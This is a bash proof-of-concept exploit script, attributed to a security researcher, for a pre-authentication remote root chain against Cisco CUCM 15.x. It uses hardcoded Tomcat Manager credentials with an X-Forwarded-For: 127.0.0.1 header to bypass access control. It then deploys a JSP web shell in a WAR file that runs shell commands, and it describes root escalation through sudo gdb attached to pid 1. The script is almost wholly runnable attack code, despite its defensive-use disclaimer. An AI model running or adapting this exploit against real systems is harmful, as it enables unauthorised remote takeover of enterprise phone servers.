#!/bin/bash
# PoC — Pre-Authentication Remote Root on Cisco CUCM 15.x
# Advisory: SKYLINE-2026-001
# Researcher: 0xReadingSteiner
#
# FOR DEFENSIVE AND EDUCATIONAL PURPOSES ONLY.
# Only run against systems you own or have explicit written authorization to test.
#
# Usage: ./poc.sh <TARGET_HOST>
#
# This script demonstrates the full pre-auth root chain:
#   Step 1: X-Forwarded-For bypass to reach Tomcat Manager
#   Step 2: WAR deployment for RCE as tomcat
#   Step 3: Privilege escalation to root via sudo gdb

set -euo pipefail

TARGET="${1:-}"
if [ -z "$TARGET" ]; then
  echo "Usage: $0 <TARGET_HOST>"
  echo "Example: $0 192.168.1.100"
  exit 1
fi

TOMCAT_USER="1mJdd4WKi+"
TOMCAT_PASS="1ge1AVWsx~"
MANAGER_URL="https://${TARGET}:443/manager/text"

echo "=========================================="
echo " CUCM 15.x Pre-Auth Root PoC"
echo " Target: ${TARGET}"
echo " Advisory: SKYLINE-2026-001"
echo "=========================================="
echo ""

# ─── Step 0: Verify target is CUCM ───
echo "[*] Step 0: Verifying target..."
HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}:443/ccmadmin/" 2>/dev/null || echo "000")
if [ "$HTTP_CODE" = "000" ]; then
  echo "[-] Cannot reach ${TARGET}:443. Is the host up?"
  exit 1
fi
echo "[+] Target responds on HTTPS (HTTP ${HTTP_CODE})"

# ─── Step 1: Test X-Forwarded-For bypass ───
echo ""
echo "[*] Step 1: Testing X-Forwarded-For bypass..."

echo "    [1a] Without X-Forwarded-For header:"
RESP_NO_XFF=$(curl -sk -o /dev/null -w "%{http_code}" \
  -u "${TOMCAT_USER}:${TOMCAT_PASS}" \
  "${MANAGER_URL}/list" 2>/dev/null)
echo "         HTTP ${RESP_NO_XFF} (expected: 403)"

echo "    [1b] With X-Forwarded-For: 127.0.0.1:"
RESP_XFF=$(curl -sk -w "\n%{http_code}" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -u "${TOMCAT_USER}:${TOMCAT_PASS}" \
  "${MANAGER_URL}/list" 2>/dev/null)
XFF_CODE=$(echo "$RESP_XFF" | tail -1)
XFF_BODY=$(echo "$RESP_XFF" | head -1)
echo "         HTTP ${XFF_CODE} (expected: 200)"

if [ "$XFF_CODE" != "200" ]; then
  echo "[-] X-Forwarded-For bypass failed. Target may be patched or not vulnerable."
  exit 1
fi
echo "[+] VULNERABLE — Tomcat Manager accessible via X-Forwarded-For bypass"
echo "    Response: ${XFF_BODY:0:80}..."

# ─── Step 2: Deploy PoC WAR ───
echo ""
echo "[*] Step 2: Deploying PoC WAR (executes 'id' + 'cat /etc/hostname')..."

WORK_DIR=$(mktemp -d)
cat > "${WORK_DIR}/index.jsp" << 'JSP'
<%@ page import="java.io.*" %>
<%
out.println("=== CUCM PoC - Command Execution as tomcat ===");
out.println("");

// id
Process p1 = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"});
BufferedReader br1 = new BufferedReader(new InputStreamReader(p1.getInputStream()));
String line; while ((line = br1.readLine()) != null) out.println("id: " + line);

// hostname
Process p2 = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","cat /etc/hostname"});
BufferedReader br2 = new BufferedReader(new InputStreamReader(p2.getInputStream()));
while ((line = br2.readLine()) != null) out.println("hostname: " + line);

// sudoers check
Process p3 = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","sudo -l 2>/dev/null | head -20"});
BufferedReader br3 = new BufferedReader(new InputStreamReader(p3.getInputStream()));
out.println("");
out.println("=== sudo -l (escalation paths) ===");
while ((line = br3.readLine()) != null) out.println(line);
%>
JSP

(cd "${WORK_DIR}" && jar cf poc.war index.jsp)

DEPLOY_RESP=$(curl -sk -w "\n%{http_code}" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -u "${TOMCAT_USER}:${TOMCAT_PASS}" \
  -T "${WORK_DIR}/poc.war" \
  "${MANAGER_URL}/deploy?path=/skyline-poc&update=true" 2>/dev/null)
DEPLOY_CODE=$(echo "$DEPLOY_RESP" | tail -1)
DEPLOY_BODY=$(echo "$DEPLOY_RESP" | head -1)

echo "    Deploy response: HTTP ${DEPLOY_CODE}"
echo "    ${DEPLOY_BODY}"

if [ "$DEPLOY_CODE" != "200" ]; then
  echo "[-] WAR deployment failed."
  rm -rf "${WORK_DIR}"
  exit 1
fi

echo "[+] WAR deployed. Executing..."
echo ""
echo "─── Command Output ───"
curl -sk "https://${TARGET}:443/skyline-poc/" 2>/dev/null
echo ""
echo "──────────────────────"

# ─── Step 3: Demonstrate root escalation path (read-only proof) ───
echo ""
echo "[*] Step 3: Root escalation via sudo gdb (demonstrating path, not executing)..."
echo "    The tomcat user can run:"
echo "      sudo -n /usr/bin/gdb -pid 1 --command=/tmp/gdb_file"
echo "    Where /tmp/gdb_file contains:"
echo '      shell <arbitrary-command-as-root>'
echo '      detach'
echo '      quit'
echo ""
echo "    This was confirmed live — see ADVISORY.md for full results."

# ─── Cleanup ───
echo ""
echo "[*] Cleaning up — undeploying PoC WAR..."
curl -sk \
  -H "X-Forwarded-For: 127.0.0.1" \
  -u "${TOMCAT_USER}:${TOMCAT_PASS}" \
  "${MANAGER_URL}/undeploy?path=/skyline-poc" >/dev/null 2>&1
rm -rf "${WORK_DIR}"

echo "[+] Cleanup complete."
echo ""
echo "=========================================="
echo " Result: CUCM ${TARGET} is VULNERABLE"
echo " Pre-auth RCE confirmed. Root escalation"
echo " path available via sudo gdb/systemctl."
echo "=========================================="
